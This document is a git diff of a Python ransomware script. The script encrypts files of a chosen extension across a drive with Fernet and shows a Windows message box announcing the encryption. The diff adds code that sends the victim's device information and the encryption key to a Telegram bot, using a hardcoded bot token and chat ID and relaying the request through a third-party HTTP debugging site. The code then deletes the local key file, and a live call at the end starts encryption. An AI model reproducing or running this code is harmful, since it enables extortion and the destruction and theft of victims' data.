@@ -5,6 +5,7 @@ from subprocess import check_output
 from cryptography.fernet import Fernet
 import os
 import platform
+import requests
 
 def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D"):
     if key == 1:  
@@ -12,18 +13,21 @@ def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D
 
     Encrypt = Fernet(key)
 
-    key_file = open("key", "w")   #just for test
-    key_file.write(str(key))      #just for test
+    key_file = open("key", "w")   
+    key_file.write(str(key))      
     key_file.close()
 
-    device_info = platform.uname()
-        for data in device_info:
-            info_file = open("device_info", "a")
-            info_file.write(str(data) + "\n")
-            info_file.close()
+    os_info = platform.uname()
+    with open("device-info", "a") as device_info:
+        device_info.truncate(0)
+        for data in os_info:
+            device_info.write(str(data) + "\n")
+        device_info.close()
+    
 
-    cmd = check_output(f"{drive}: dir /S /B *.{target_file_extention}", shell=True).decode().split() 
     try:
+        cmd = check_output(f"{drive}: && cd test && dir /S /B *.{target_file_extention}", shell=True).decode().split() 
+
         for i in cmd:
             try:
                 with open(i, "rb") as thisfile:
@@ -40,10 +44,30 @@ def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D
 
         if platform.uname()[0] == "Windows":
             import win32api
-            win32api.MessageBox(0, 'Part/All of your computer was encrypted!', 'title')
+            win32api.MessageBox(0, 'Part/All of your computer was encrypted!', 'Oh...!')
 
     except:
         pass
+
+    try:
+        with open("device-info", "r") as device_info:
+            info = device_info.read()
+            keyfile = open("key", "r")
+            key = keyfile.read()
+            url = ("https://api.telegram.org/bot5265148504:AAEYGDSA2cMi4Eq5XQyDPEwyeH7coIn6k9s/SendMessage?chat_id=1202560419&text="+str(info)+"\n"+str(key))
+
+            payloud = {"UrlBox":url,
+                        "AgentList":"Mozilla Firefox",
+                        "VersionList":"HTTP/1.1",
+                        "MethodList":"POST"
+            }
+            req = requests.post("HTTPS://WWW.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloud)
+            print(req)
+            os.remove(os.getcwd()+"\device-info")
+            os.remove(os.getcwd()+"\key")
+    except: pass
+
+
 
 def dec(encrypted_file_extention="maher", key=1, drive="D"):
     if key == 1:
@@ -56,9 +80,9 @@ def dec(encrypted_file_extention="maher", key=1, drive="D"):
     
     Decrypt = Fernet(key)
 
-    cmd = check_output(f"{drive}: && dir /S /B *.{encrypted_file_extention}", shell=True).decode().split()
-
     try:
+        cmd = check_output(f"{drive}: && cd test && dir /S /B *.{encrypted_file_extention}", shell=True).decode().split()
+
         for i in cmd:
                 try:
                     with open(i, "rb") as thisfile:
@@ -72,12 +96,16 @@ def dec(encrypted_file_extention="maher", key=1, drive="D"):
                         print(i + "------------> " + "Decrypted")
                 except:
                     pass
-        if platform.uname()[0] == "Windows":
-            import win32api
-            win32api.MessageBox(0, 'Part/All of your computer was decrypted!', 'title')
+        try:
+            if platform.uname()[0] == "Windows":
+                import win32api
+                win32api.MessageBox(0, 'Part/All of your computer was decrypted!', 'Oh...!')
+        except: pass
 
 
     except:
         pass
+enc("txt","maher",1,"f")
+#dec(drive="f")
 
 
